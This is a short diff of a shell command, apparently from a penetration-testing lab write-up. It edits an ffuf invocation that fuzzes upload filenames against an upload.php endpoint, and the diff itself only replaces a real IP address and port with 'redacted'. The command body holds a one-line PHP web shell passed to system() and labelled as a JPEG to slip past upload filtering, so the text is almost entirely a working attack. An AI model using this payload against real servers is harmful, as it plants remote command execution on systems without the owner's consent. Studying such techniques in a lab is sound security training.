@@ -1,6 +1,6 @@
 ─$ ffuf -w wordlist.txt:FUZZ \
      -X POST \
-     -u http://83.136.251.68:53279/upload.php \
+     -u http://redacted/upload.php \
      -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitUbq2yCeq0Acg5S' \
      -b "PHPSESSID=YOUR_SESSION" \
      --data-binary $'------WebKitFormBoundaryitUbq2yCeq0Acg5S\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryitUbq2yCeq0Acg5S--\r\n' \
